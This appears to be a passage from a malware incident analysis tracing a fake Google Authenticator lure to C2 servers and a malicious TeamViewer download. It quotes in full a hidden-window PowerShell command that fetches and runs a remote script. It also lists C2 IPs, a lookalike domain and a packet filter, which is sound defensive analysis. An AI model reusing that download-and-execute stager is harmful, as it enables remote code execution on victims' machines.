	At 19:45:56 UTC a GET request was made to `http://5.252.153[.]241/api/file/get-file/264872`

This executed the following powershell command

```powershell
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command ""start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).'DownloadString'('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com""
```
This script seems to download another powershell file. The 29842.ps1 file seems to be obfuscated but it seems to try to make a connection to 5.252.153[.]241. After a few tries it succeeds and it downloads the malicious teamviewer.exe file. 

When checking for other C2 server, the IP address 45.125.66[.]32 also came to view.

```
tcp.flags eq 0x0002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst eq 10.1.17.0/24)
```

The domain likely used for the fake Google Authenticator page is authenticatoor[.]org.
